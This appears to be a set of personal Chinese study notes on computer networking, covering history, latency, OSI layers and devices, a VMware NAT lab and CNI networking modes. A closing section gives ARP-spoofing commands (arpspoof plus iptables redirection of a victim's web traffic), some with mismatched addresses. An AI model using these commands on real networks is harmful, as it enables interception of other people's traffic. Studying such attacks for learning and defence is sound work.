 # 网络
# 历史
好的，我们来系统地梳理一下**计算机网络的发展历程**，从早期实验到现代互联网，再到未来趋势。为了清晰，我会按阶段、技术特点和应用影响来说明。

---

## **1. 初期阶段（1960s–1970s）——实验网络与分组交换**

* **背景**：当时计算机体积大、昂贵，主要用于科研和军工。
* **核心技术**：

  * **分组交换（Packet Switching）**：信息不再以整块数据传输，而是拆成小包发送，提高了网络利用率。
  * **ARPANET（1969）**：美国国防部的科研项目，被认为是现代互联网的雏形。
* **特点与意义**：

  * 连接少量计算机，实现远程共享资源。
  * 提出了基本的网络协议概念（如早期的NCP）。

---

## **2. 网络协议标准化阶段（1970s–1980s）——TCP/IP与局域网**

* **背景**：网络越来越多，异构系统需要互联。
* **核心技术**：

  * **TCP/IP（1974提出，1983正式启用）**：

    * TCP：负责可靠传输。
    * IP：负责寻址和路由。
  * **局域网（LAN）**：如Ethernet，以太网（1973年）实现了小范围内高速互联。
* **特点与意义**：

  * 使不同类型计算机可以互联（跨厂商）。
  * 为互联网的全球化奠定基础。

---

## **3. 互联网初期与商业化（1980s–1990s）**

* **背景**：科研网络向商业网络扩展，TCP/IP成为事实标准。
* **核心技术与事件**：

  * **DNS（域名系统，1984）**：解决IP地址难记问题。
  * **SMTP/POP/HTTP/FTP**：基础应用协议成熟。
  * **WWW（1991）**：万维网的发明使互联网从科研工具变成信息平台。
* **特点与意义**：

  * 网络用户从科研机构扩展到企业和个人。
  * 网络规模开始呈指数级增长。

---

## **4. 宽带与移动互联网阶段（2000s–2010s）**

* **背景**：用户对速度、稳定性、移动性要求增加。
* **核心技术**：

  * **宽带接入**：DSL、光纤、Cable Modem。
  * **无线网络**：Wi-Fi 802.11、3G/4G移动通信。
  * **网络应用**：视频、社交媒体、云计算开始普及。
* **特点与意义**：

  * 网络不仅是信息传递工具，也是商业与娱乐基础设施。
  * 提高了网络服务的实时性和可用性。

---

## **5. 云计算与物联网阶段（2010s–2020s）**

* **背景**：海量设备接入，数据中心成为核心。
* **核心技术**：

  * **云计算**：AWS、Azure 等提供弹性计算和存储。
  * **物联网（IoT）**：大量传感器设备联网，支持智能家居、工业4.0。
  * **IPv6**：应对IP地址枯竭问题。
* **特点与意义**：

  * 网络不仅连接人，还连接设备。
  * 数据流量激增，网络架构更复杂（CDN、边缘计算）。

---

## **6. 未来趋势（2020s及以后）**

* **核心方向**：

  * **6G与未来无线网络**：更高速度、更低延迟、支持全息通信。
  * **网络智能化**：AI驱动网络优化、自适应路由。
  * **边缘计算与网络切片**：更贴近用户和设备的分布式计算。
  * **量子通信与安全网络**：实现理论上无条件安全的数据传输。
* **意义**：

  * 网络将更深地融入生活、工业和科学研究。
  * 更注重低延迟、高可靠性、安全和智能管理。

---

如果用一句话概括网络发展脉络：

> **从“科研实验室的小型互联” → “全球信息共享平台” → “万物互联的智能网络”。**

# 性能指标
时延，在计算机网络里通常指 **数据从发送端到接收端所需的时间**，是衡量网络性能的重要指标。

---

## **1. 时延的定义**

* **英文**：Latency / Delay
* **基本含义**：

  > 从网络上发送一个数据包（或信号）开始，到接收端收到这个数据包所花费的时间。
* **单位**：秒（s）、毫秒（ms）

---

## **2. 网络时延的组成**

网络总时延可以分为几个部分：

| 时延类型                         | 解释                    | 计算或特点                                                                    |
| ---------------------------- | --------------------- | ------------------------------------------------------------------------ |
| **传播时延（Propagation Delay）**  | 信号在物理介质上传播所需时间        | ( t_p = \frac{\text{距离}}{\text{信号传播速度}} ) <br> 光纤中约 (2 \times 10^8\ m/s) |
| **传输时延（Transmission Delay）** | 把整个数据包从发送端发出到线路上所需时间  | ( t_t = \frac{\text{数据包长度 (bits)}}{\text{链路带宽 (bps)}} )                  |
| **处理时延（Processing Delay）**   | 路由器或交换机处理包头、检查错误的时间   | 一般微秒级到毫秒级                                                                |
| **排队时延（Queuing Delay）**      | 数据包在路由器/交换机缓冲区等待转发的时间 | 取决于网络拥塞程度，可能从几微秒到数百毫秒不等                                                  |

> 总时延 = 传播时延 + 传输时延 + 处理时延 + 排队时延

---

## **3. 举例说明**

假设一条 1000 km 光纤链路，传输 1 Mb 数据包，链路带宽 1 Mbps：

1. **传播时延**：
   $$
   t_p = \frac{1000,\text{km}}{2\times10^8,\text{m/s}} = 5,ms
   $$

2. **传输时延**：
   $$
   t_t = \frac{1,\text{Mb}}{1,\text{Mbps}} = 1,s
	$$

3. **处理时延 + 排队时延**：假设 5 ms
   **总时延** ≈ 1.01 s

> 可以看出，**低带宽或大包长度**时，传输时延占主导；长距离时，传播时延占主导；网络拥塞严重时，排队时延可能增加显著延迟。

---

## **4. 时延在网络中的意义**

* **对实时应用的影响**：

  * 视频会议、在线游戏 → 高时延会造成卡顿和不流畅
  * 金融交易 → 毫秒级延迟都可能影响交易效率
* **衡量网络质量**：

  * Ping 命令测量 RTT（Round Trip Time，往返时延）
  * 时延低 → 网络快，响应及时
  * 时延高 → 网络慢，用户体验差

## 5. 时延带宽积
明白了，你想了解 **时延-带宽积（Bandwidth–Delay Product, BDP）**，这是网络传输中的一个核心概念，尤其在长距离高带宽网络中非常重要。我们可以分步骤解释。

---

## **1. 定义**

> **时延-带宽积（BDP）** = 链路的带宽 × 往返时延（或单程时延）

* **公式**：
  $$
  \text{BDP} = \text{带宽 (bps)} \times \text{时延 (s)}
  $$
* **单位**：比特（bits），也可换算为字节（Bytes）
* **含义**：链路上“在任何时刻飞行的数据量”，即发送端在接收端收到第一个比特之前，可以发送多少比特仍在链路中。

---

## **2. 举例说明**

假设有一条 1000 km 的光纤链路：

* 光纤传播速度约 $(2 \times 10^8\ m/s)$
* 单程传播时延：
  $$
  t_p = \frac{1000 \times 1000}{2\times10^8} = 0.005\ s = 5\ ms
  $$
* 链路带宽：1 Gbps
* **BDP**：
  $$
  \text{BDP} = 1,\text{Gbps} \times 0.005,\text{s} = 5,\text{Mb}
  $$

> 这意味着，在发送端发送完 5 Mb 数据后，接收端才刚刚开始收到第一个比特。

---

## **3. BDP 的意义**

1. **缓冲区设计**：

   * TCP 协议发送端/接收端缓冲区要至少等于 BDP，否则不能充分利用链路带宽。
   * BDP 较大 → 需要更大的窗口（TCP window）和缓冲区。

2. **高带宽长时延网络（Long Fat Network, LFN）**：

   * 光纤跨洲链路、卫星通信链路常见。
   * 如果忽略 BDP，TCP 会因为窗口太小而无法满速发送数据，即使带宽很高，也利用不足。

3. **优化传输效率**：

   * 了解 BDP 可以设置合适的 **TCP 窗口大小**、**缓冲区大小**，避免链路空闲。

---

## **4. 直观理解**

* BDP = “链路上同时在飞的数据量”。
* 类比：高速公路：

  * **带宽** = 车道数量（每秒能通过多少车）
  * **时延** = 公路长度（车从起点到终点需要时间）
  * **BDP** = 公路上同时行驶的车辆总数

# 物理层
物理层考虑的是怎样才能在连接各种计算机的传输媒体上传输数据比特流
物理层的主要任务
- **任务/职责**：
    1. 将比特流转换为物理信号（电信号、光信号或无线电波）。
    2. 定义物理介质（光纤、双绞线、无线频段）和接口标准。
    3. 决定数据传输速率（带宽）和距离限制。
- **典型设备**：
    - 光纤收发器、调制解调器、无线发射/接收天线
- **典型问题**：
    - 信号衰减、干扰、噪声导致误码
    - 解决方式：重复器、中继、纠错码

|设备|功能|典型应用|
|---|---|---|
|**集线器（Hub）**|将信号放大并广播到多个端口；不做数据处理|小型局域网连接，多用于早期以太网|
|**中继器（Repeater）**|接收、放大并重发信号，延长传输距离|光纤/电缆长距离传输|
|**调制解调器（Modem）**|将数字信号调制为模拟信号（上行），解调为数字信号（下行）|拨号上网、DSL|
|**光纤收发器**|将电信号转换为光信号，或者光信号转换为电信号|光纤链路、城域网、数据中心|
|**无线发射/接收设备**|负责发送/接收无线电波|Wi-Fi AP、移动基站、卫星天线|
|**传输介质**|物理传输路径|光纤、电缆（双绞线、同轴线）、空气/空间|
# 链路层
- **任务/职责**：
    1. 将物理比特流封装成帧（Frame）传输。
    2. 提供**局域网内的可靠传输**，包括差错检测和纠正。
    3. 控制访问介质（如以太网的 CSMA/CD）。
    4. 支持局域网互连（VLAN、桥接）。
- **典型设备**：
    - 交换机、网桥、光猫
- **协议示例**：
    - Ethernet、Wi-Fi (MAC 层)、PPP
- **典型问题**：
    - 冲突检测、广播风暴
    - 解决方式：交换、VLAN、MAC 地址管理

| 设备                                  | 功能与特点                                                                 |
| ----------------------------------- | --------------------------------------------------------------------- |
| **网卡（NIC, Network Interface Card）** | 负责将计算机的比特流封装成帧并在物理介质上发送；MAC地址就在网卡上固定。                                 |
| **交换机（Switch）**                     | 数据链路层核心设备之一。- 根据 MAC 地址转发帧- 支持全双工通信- 提高局域网效率- 屏蔽冲突域（collision domain） |
| **桥接器（Bridge）**                     | 将两个局域网连接起来- 根据 MAC 地址学习和转发帧- 功能上是早期交换机的原型                             |
| **无线接入点（AP, Access Point）**         | Wi-Fi网络中的数据链路层设备- 管理无线帧发送- 处理冲突避免（CSMA/CA）                            |
| **DSL/Cable/光猫（Modem/ONU/ONT）**     | 家庭宽带设备- 封装上层数据成 DSL、HFC 或 PON帧- MAC层管理接入和错误检测                         |
| **令牌环设备（Token Ring Hub/MAU）**       | 旧式局域网设备- 用令牌控制介质访问- 保证帧按序传输                                           |
| **光纤交换机 / OLT / PON分光器**            | 光纤接入网设备- 处理 PON 或 EPON / GPON 帧- 控制带宽分配和流量                            |

## 网络拓扑

# 网络层
- **任务/职责**：
    1. **逻辑寻址**：给每个节点分配 IP 地址。
    2. **路由选择**：决定数据包从源到目的地的路径。
    3. **拥塞控制和分组转发**：将数据切分为适合传输的分组。
- **典型设备**：
    - 路由器、三层交换机
- **协议示例**：
    - IP (IPv4, IPv6), ICMP, OSPF, BGP
- **典型问题**：
    - 网络拥塞、路由环路
    - 解决方式：路由算法、负载均衡、流量管理

|设备|功能|
|---|---|
|**路由器（Router）**|核心网络层设备- 连接不同网络- 根据 IP 地址和路由表转发数据包- 支持 NAT、防火墙、QoS|
|**三层交换机（Layer 3 Switch）**|结合交换机和路由器- 在局域网内实现 VLAN 间路由- 高速数据包转发，适合企业网|
|**防火墙（Firewall）**|可在网络层过滤数据包- 根据源/目的 IP 地址、协议类型、端口号控制访问|
|**负载均衡器（Load Balancer）**|在网络层可根据 IP 进行流量分发- 分散服务器负载，提高可用性|
|**网关（Gateway）**|不同协议网络间互连- IP 网关、协议转换网关|
|**隧道设备 / VPN网关**|封装网络层数据包，实现跨网络安全传输|
|**NAT设备**|网络地址转换，隐藏内网 IP，允许公网访问|

# 传输层
- **任务/职责**：
    1. 提供端到端通信，保证数据从源应用到目标应用的可靠传输。
    2. 流量控制、差错检测、重传机制。
    3. 多路复用和端口管理，区分不同应用（端口号）。
- **协议示例**：
    - TCP（可靠传输、顺序、重传）
    - UDP（无连接、低延迟）
- **典型问题**：
    - 丢包、乱序、拥塞
    - 解决方式：TCP 窗口、拥塞控制算法

常用设备

| 设备类型                                     | 功能/作用        | 运输层相关特点                         | 典型应用            |
| ---------------------------------------- | ------------ | ------------------------------- | --------------- |
| **防火墙（Firewall）**                        | 控制网络访问       | 基于TCP/UDP端口号过滤，支持状态检测（Stateful） | 阻止未授权访问，网络安全防护  |
| **负载均衡器（Load Balancer）**                 | 分发流量，提高服务可用性 | 根据TCP/UDP会话和端口分流（L4负载均衡）        | Web服务、高并发应用流量分发 |
| **NAT设备（Network Address Translation）**   | IP地址和端口转换    | 修改TCP/UDP端口，实现私网与公网通信           | 家庭路由器、企业网关      |
| **深度包检测设备（DPI, Deep Packet Inspection）** | 分析网络流量，监控或优化 | 可解析TCP/UDP流量，判断应用协议             | 安全监控、流量优化、QoS管理 |
| **TCP/UDP代理服务器**                         | 转发或缓存流量      | 直接处理运输层协议，支持端口映射                | 代理服务、加速访问、穿透防火墙 |
| **高性能交换机（部分L4交换机）**                      | 流量分发和优化      | 支持基于端口的四层流量管理                   | 数据中心内部流量调度      |
## 端口
**端口（Port）**是运输层（TCP/UDP）用来标识**不同进程或应用程序的逻辑编号，通过协议使用网络接口。

| 类型                                 | 范围          | 说明                                      |
| ---------------------------------- | ----------- | --------------------------------------- |
| **知名端口（Well-known ports）**         | 0-1023      | 系统服务/常用协议使用，比如 HTTP 80，HTTPS 443，FTP 21 |
| **注册端口（Registered ports）**         | 1024-49151  | 用户进程或服务申请注册使用，比如 MySQL 3306             |
| **动态/私有端口（Dynamic/Private ports）** | 49152-65535 | 临时使用端口，客户端随机分配，用于短时会话                   |

## UDP
# 应用层
- **任务/职责**：
    1. 提供用户直接使用的网络服务接口。
    2. 定义应用数据格式和通信规则。
    3. 支持人机交互和业务应用。
- **协议示例**：
    - HTTP / HTTPS（网页浏览）
    - FTP / SFTP（文件传输）
    - SMTP / IMAP / POP3（邮件）
    - DNS（域名解析）
- **典型问题**：
    - 安全（认证、加密）、性能（响应时间、并发）
    - 解决方式：TLS/SSL 加密、CDN 加速

## NAT
 ### 环境
  虚拟机镜像
	 ==Ubuntu 24.04.02==
 宿主机环境
	 ==Windows 11==
	 ==VMWare workstation 17.6.3==
	 ==Tabby 1.0.223==
### 实验步骤：
1. 先通过 VMWare安装 os
2. 网络模式选择 NAT
3. 安装后在 VMWare 中选择 编辑 -> 虚拟网络编辑器
4. 在虚拟网络编辑器中选择 更改设置 ，之后选择 NAT 所在的网卡接口
5. 配置子网范围
6. 选择 NAT 设置，配置网关 IP，端口转发等，比如配置转发虚拟机中的22端口
7. 用 Tabby 测试 ssh 连接，地址是 127.0.0.1 端口是刚刚配置的宿主机端口
### 实验总结
NAT 方式的**优点**：
更加安全，只有通过端口转发才能访问内部主机的资源。
NAT 方式的**缺点**：
端口转发会牺牲些性能，而且使过程复杂了些
# 网络攻击
## ARP欺骗
```sh
# 安装工具
sudo apt install dsniff

# 开启转发
sudo sysctl -w net.ipv4.ip_forward=1

# 将流量都发送到自己机器上
sudo arpspoof -i enp0s3 -t 192.168.0.100 192.168.0.1
sudo arpspoof -i enp0s3 -t 192.168.0.1 192.168.0.100

# 规则 NAT 重定向
sudo iptables -t nat -A PREROUTING -i enp0s3 -s 192.168.0.100 -p tcp --dport 80 -j DNAT --to-destination 192.168.0.100:80

# 规则 允许 HTTP 转发
sudo iptables -A FORWARD -s 192.168.0.100 -d 192.168.0.100 -p tcp --dport 80 -j ACCEPT
sudo iptables -A FORWARD -d 192.168.0.100 -s 192.168.0.100 -p tcp --sport 80 -j ACCEPT
# 规则 重定向到 80
sudo iptables -t nat -A PREROUTING -s 192.168.1.100 -p tcp --dport 80 -j REDIRECT --to-port 80
sudo iptables -t nat -A PREROUTING -s 192.168.1.100 -p tcp --dport 443 -j REDIRECT --to-port 80


# 规则 阻断其它所有流量
sudo iptables -A FORWARD -s 192.168.0.100 -j DROP
sudo iptables -A FORWARD -d 192.168.0.100 -j DROP

```

| **特性**    | **VXLAN (Overlay)**          | **BGP (Underlay/Routing)** | **VPC Native (云原生直通)**         |
| --------- | ---------------------------- | -------------------------- | ------------------------------ |
| **本质**    | **隧道封装**：在 UDP 包里装以太网帧。      | **路由扩散**：把 Pod IP 宣告给交换机。  | **资源映射**：Pod 直接使用 VPC 的 IP/网卡。 |
| **性能损耗**  | **较高** (有封包开销 & MTU 限制)。     | **极低** (原生转发，无开销)。         | **无** (等同于云服务器原生性能)。           |
| **网络层级**  | 逻辑上的二层 (L2 over L3)。         | 纯三层 (L3)。                  | 扁平化，Pod 与 VM 在同一层。             |
| **配置复杂度** | **极低**：安装 CNI 即可用。           | **高**：需配置交换机或 BGP 邻居。      | **中**：需云厂商插件及权限配置。             |
| **故障排查**  | **难**：抓包看到的是封装后的 UDP。        | **易**：直观看到 Pod 间 IP 通信。    | **最易**：云平台控制台直接监控。             |
| **代表方案**  | Flannel VXLAN, Calico VXLAN。 | Calico BGP, Cilium BGP。    | 阿里云 Terway, AWS VPC CNI。       |
